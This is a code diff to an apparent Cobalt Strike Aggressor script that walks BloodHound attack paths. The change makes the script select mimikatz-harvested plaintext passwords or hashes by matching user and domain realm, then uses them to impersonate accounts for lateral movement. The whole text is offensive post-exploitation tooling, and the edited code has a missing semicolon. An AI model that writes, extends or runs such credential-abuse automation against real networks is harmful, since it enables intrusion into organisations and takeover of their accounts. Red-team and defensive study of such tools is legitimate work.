@@ -11,7 +11,7 @@ include(script_resource("cypher.cna"));
 include(script_resource("utils.cna"));
 #include(script_resource("com-exec.cna"));
 
-global('@edges @nodes @final $waitFor $currentBid $nextLabel $True $False $attackActive $pos $listener $psexec $mimikatz $randomPuppy $machineNo $jsonFile $lateralMethod $listenerChoice $operator');
+global('@edges @nodes @final $waitFor $currentBid $nextLabel $True $False $attackActive $pos $listener $psexec $mimikatz $randomPuppy $machineNo $jsonFile $lateralMethod $realm $listenerChoice $operator');
 
 # Parse BloodHound graph.json and add nodes
 sub parseNodes {
@@ -163,6 +163,7 @@ sub removeGroups {
 	foreach $i => $item (@nodes){
     	if ($item["type"] ne "Group"){
     		if ($item["type"] eq "User"){
+                $realm = bhUserToDomain-sub($item["label"]);
     			$item["label"] = bhUserToCS-sub($item["label"]);
     		}
             else {
@@ -204,29 +205,65 @@ sub getToken {
     # We got the set of credentials we need in the cred store, we want to grab it out now.
 
     $plaintext = $False;
-    $hashes = $False;
+    $hashes = $False
+    $realmFound = $False;
+
+    # realm checks
+
     # For each cred in the database, check if it matches the user we want to make token for
     foreach $cred (credentials()){
         println("Comparing " . $cred["user"] . " vs. " . $nextLabel);
         # Check if password is hashed or plaintext
-        if (($nextLabel eq uc($cred["user"])) && ($cred["password"] !ismatch "[0-9a-f]{32}") && ($cred["source"] eq "mimikatz")) {
+        if (($nextLabel eq uc($cred["user"])) && ($cred["password"] !ismatch "[0-9a-f]{32}") && ($cred["source"] eq "mimikatz") && (uc($cred["realm"])) eq uc($realm)) {
             # Current $Cred object 
             $targetCreds = $cred;
             $plaintext = $True;
+            $realmFound = $True;
             break;
         }
     }
+
+    if ($realmFound eq $False){
     # Plaintext found? If not, let's go for a look at finding hashes.
-    if ($plaintext eq $False){
+        if ($plaintext eq $False){
+            foreach $cred (credentials()){
+                if (($nextLabel eq uc($cred["user"])) && ($cred["source"] eq "mimikatz") && (uc($cred["realm"])) eq uc($realm)) {
+                    # Current $Cred object 
+                    $targetCreds = $cred;
+                    $hashes = $True;
+                    $plaintext = $False;
+                    $realmFound = $True;
+                    break;
+                }
+            }
+        }
+    }
+
+    if ($realmFound eq $False){
+        # For each cred in the database, check if it matches the user we want to make token for
         foreach $cred (credentials()){
-            if (($nextLabel eq uc($cred["user"])) && ($cred["source"] eq "mimikatz")) {
+            println("Comparing " . $cred["user"] . " vs. " . $nextLabel);
+            # Check if password is hashed or plaintext
+            if (($nextLabel eq uc($cred["user"])) && ($cred["password"] !ismatch "[0-9a-f]{32}") && ($cred["source"] eq "mimikatz")) {
                 # Current $Cred object 
                 $targetCreds = $cred;
-                $hashes = $True;
-                $plaintext = $False;
+                $plaintext = $True;
                 break;
             }
         }
+        # Plaintext found? If not, let's go for a look at finding hashes.
+        if ($plaintext eq $False){
+            foreach $cred (credentials()){
+                if (($nextLabel eq uc($cred["user"])) && ($cred["source"] eq "mimikatz")) {
+                    # Current $Cred object 
+                    $targetCreds = $cred;
+                    $hashes = $True;
+                    $plaintext = $False;
+                    break;
+                }
+            }
+        }
+
     }
 
     if (($plaintext eq $True || $hashes eq $True) && (uc($targetCreds["user"]) eq $nextLabel)) {
